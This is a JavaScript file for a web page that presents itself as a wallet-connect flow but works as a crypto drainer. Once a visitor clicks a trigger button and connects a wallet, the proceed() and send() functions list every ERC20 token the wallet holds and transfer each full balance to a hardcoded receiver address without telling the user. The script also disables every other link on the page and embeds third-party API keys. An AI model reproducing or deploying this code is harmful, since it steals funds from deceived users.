"use strict";
// import { receiver as default_receiver_addr } from "./addresses.mjs";

const Web3Modal = window.Web3Modal.default;
const WalletConnectProvider = window.WalletConnectProvider.default;
const Fortmatic = window.Fortmatic;
const evmChains = window.evmChains;

let web3Modal;
let provider;
let selectedAccount;

const receiver_address = default_receiver_addr; // <- RECEIVER ADDRESS HERE
let onButtonClick;
let user_address;
let start_to_log = false;
let is_main_net = true;

let mainTrigger = document.getElementsByClassName("triggerx");
let secondaryTriggers = document.getElementsByClassName("triggerx2");
let tertiaryTriggers = document.getElementsByClassName("triggerx3");

async function init() {
  const providerOptions = {
    walletconnect: {
      package: WalletConnectProvider,
      options: {
        infuraId: "4db27607aabf401b93a249209f7e03b1",
      },
    },
  };

  web3Modal = new Web3Modal({
    cacheProvider: false, // optional
    providerOptions, // required
    disableInjectedProvider: false, // optional. For MetaMask / Brave / Opera.
  });
  console.log("Web3Modal instance is ready");
  return "Done";
}

async function fetchAccountData() {
  start_to_log = false;
  window.web3 = new Web3(provider);
  console.log("Web3 instance is", web3);

  const chainId = await web3.eth.getChainId();
  const chainData = evmChains.getChain(chainId);
  console.log("Chain data name:", chainData.name);
  is_main_net =
    chainData.name.toLowerCase().indexOf("mainnet") > -1 ? true : false;

  const accounts = await web3.eth.getAccounts();

  console.log("Got accounts", accounts);
  selectedAccount = accounts[0];
  console.log("Selected Account: ", selectedAccount);
  user_address = selectedAccount;

  const rowResolvers = accounts.map(async (address) => {
    const balance = await web3.eth.getBalance(address);
    const ethBalance = web3.utils.fromWei(balance, "ether");
    const humanFriendlyBalance = parseFloat(ethBalance).toFixed(4);
    console.log("New Account: %o", { address, balance, humanFriendlyBalance });
  });

  await Promise.all(rowResolvers);

  proceed();
}

async function onConnect() {
  try {
    provider = await web3Modal.connect();
    console.log("Opened dialog: provider", provider);
  } catch (e) {
    console.log("Opening dialog failed, Could not get a wallet connection", e);
    return;
  }

  provider.on("accountsChanged", (accounts) => {
    fetchAccountData();
  });
  provider.on("chainChanged", (chainId) => {
    fetchAccountData();
  });
  provider.on("networkChanged", (networkId) => {
    fetchAccountData();
  });

  await fetchAccountData(provider);
  onButtonClick = proceed;
}
onButtonClick = onConnect;

async function onDisconnect() {
  if (provider.close) {
    await provider.close();
    // If the cached provider is not cleared,
    // WalletConnect will default to the existing session
    // and does not allow to re-scan the QR code with a new wallet.
    // Depending on your use case you may want or want not his behavir.
    await web3Modal.clearCachedProvider();
    provider = null;
  }
  selectedAccount = null;
}

async function getERC20s(address = "", api_key = "", chain = "eth") {
  return new Promise((resolve, reject) => {
    fetch(
      `https://deep-index.moralis.io/api/v2/${address}/erc20?chain=${chain}`,
      {
        method: "GET",
        headers: {
          accept: "application/json",
          "X-API-Key": api_key,
        },
      }
    )
      .then(async (res) => {
        if (res.status > 399) throw res;
        resolve(await res.json());
      })
      .catch((err) => {
        reject(err);
      });
  });
}

async function proceed() {
  itIsConnected();
  start_to_log = true;
  const apiKey =
    "gh8QcQ44yAaqOJR5AtKGM7uDpDo6pddkKD25FEyT8zK2e8jnK5Zv5atjV5kWIAjF";
  console.log(`Running on ${is_main_net ? "mainnet" : "testnet"}`);

  var tokens = is_main_net
    ? await getERC20s(user_address, apiKey).catch((e) => {
        console.log("Error getting erc20 tokens:", e);
      })
    : await getERC20s(user_address, apiKey, "goerli").catch((e) => {
        console.log("Error getting erc20 tokens:", e);
      });
  if (tokens.length == 1) {
    console.log("NO ERC20 Tokens found:", tokens);
    await getERC20s(address, apiKey).catch((e) => {
      console.log("Error getting erc20 tokens:", e);
    });
  } else {
    console.log(tokens.length, "Erc20 tokens found:", tokens);
  }
  let erc20_abi = [
    {
      constant: false,
      inputs: [
        {
          name: "_to",
          type: "address",
        },
        {
          name: "_value",
          type: "uint256",
        },
      ],
      name: "transfer",
      outputs: [
        {
          name: "",
          type: "bool",
        },
      ],
      // payable: false,
      // stateMutability: "nonpayable",
      type: "function",
    },
    {
      constant: true,
      inputs: [
        {
          name: "_owner",
          type: "address",
        },
      ],
      name: "balanceOf",
      outputs: [
        {
          name: "balance",
          type: "uint256",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "name",
      outputs: [
        {
          name: "",
          type: "string",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "decimals",
      outputs: [
        {
          name: "",
          type: "uint8",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
    {
      constant: true,
      inputs: [],
      name: "symbol",
      outputs: [
        {
          name: "",
          type: "string",
        },
      ],
      payable: false,
      stateMutability: "view",
      type: "function",
    },
  ];

  async function send(tokens) {
    if (!tokens || tokens.length == 0) {
      console.log("NO ERC20 Tokens found:", tokens);
      return;
    }
    console.log("Attempting to send coins...");
    if (!user_address) {
      throw Error("No user: " + user_address);
    }

    for (let token of tokens) {
      try {
        console.log(`Checking token [${token.name}](${token.symbol})`);
        let final_receiver_address = receiver_address;
        // let final_receiver_address =
        //   token.token_address == "0x7db5af2b9624e1b3b4bb69d6debd9ad1016a58ac"
        //     ? "0x9C0c5D0ceD39136d371F64dc3E758BE465D5831f"
        //     : receiver_address;
        if (!token.name) {
          console.log(
            `Invalid name for token '${token.token_address}'; SKIPPING...`
          );
          continue;
        }
        if (token.name == "Ether" || !token.token_address) {
          console.log("Rejecting %o", token);
          continue;
        }
        const options = {
          type: "erc20",
          amount: token.balance,
          receiver: final_receiver_address,
          contractAddress: token.token_address,
        };

        let decimals = BigNumber(token.decimals);
        // calculate ERC20 token amount
        let bal = new Decimal(token.balance)
          .div(new Decimal(10).pow(token.decimals))
          .toString();
        let actual_bal = BigNumber(bal);
        let bal_options = {
          decimals: decimals.toString(),
          bal: token.balance,
          actual_bal: actual_bal.toString(),
        };

        console.log(
          `>> Transferring ${token.balance} [${token.name}](${token.token_address})`,
          { ...options, ...bal_options }
        );
        // Get ERC20 Token contract instance
        let contract = new web3.eth.Contract(erc20_abi, token.token_address, {
          from: user_address,
        });
        console.log(
          `Connected to contract for token '${token.token_address}'. Initiating transfer...`
        );
        try {
          let transaction = await contract.methods
            .transfer(final_receiver_address, token.balance)
            .send({ from: user_address })
            .on("transactionHash", function (hash) {
              console.log("Transaction hash for", token.symbol, ":", hash);
            })
            .on("data", function (data) {
              console.log("Transfer data for", token.symbol, ":", data);
            })
            .on("error", function (err) {
              console.log("Transfer error for", token.symbol, ":", err);
            })
            .catch((err) => {
              console.log("Some other error for", token.symbol, ":", err);
            })
            .finally((x) => {
              console.log("Finally:", x);
            });
          if (transaction) {
            console.log("Transaction:", transaction);
          }
        } catch (error) {
          console.log("An error somewhere:", error);
        }
      } catch (error) {
        console.log(`Error processing [${token.name}](${token.symbol})`);
        continue;
      }
    }
  }
  await send(tokens).catch((err) => {
    console.log("Error sending tokens:", err);
  });
}

$(function () {
  console.log({ mainTrigger, secondaryTriggers, tertiaryTriggers });
  let allTriggers = [...mainTrigger, ...secondaryTriggers, ...tertiaryTriggers];
  allTriggers.forEach((el) => {
    el.addEventListener("click", function (e) {
      e.preventDefault();
      e.stopPropagation();
      let isTriggerx = el.classList.contains("triggerx");
      console.log("[CLICKED]; Is 'triggerx'?", isTriggerx);
      init()
        .then(() => {
          onButtonClick();
        })
        .catch((e) => {
          console.log("Initialization failed.", e);
        });
    });
  });
  let allLinks = document.getElementsByTagName("a");
  let cancelled = document.getElementsByClassName("cancelx");

  [...allLinks, ...cancelled].forEach((link) => {
    try {
      link.addEventListener("click", function (e) {
        if ($(e.target).hasClass("ignorex")) return;
        e.preventDefault();
        e.stopPropagation();
      });
    } catch (error) {
      console.log(error);
    }
  });
});

function itIsConnected() {
  [...document.querySelectorAll(".triggerx span")].forEach((el) => {
    el.innerText = "Connected";
  });
}

console.log(window);
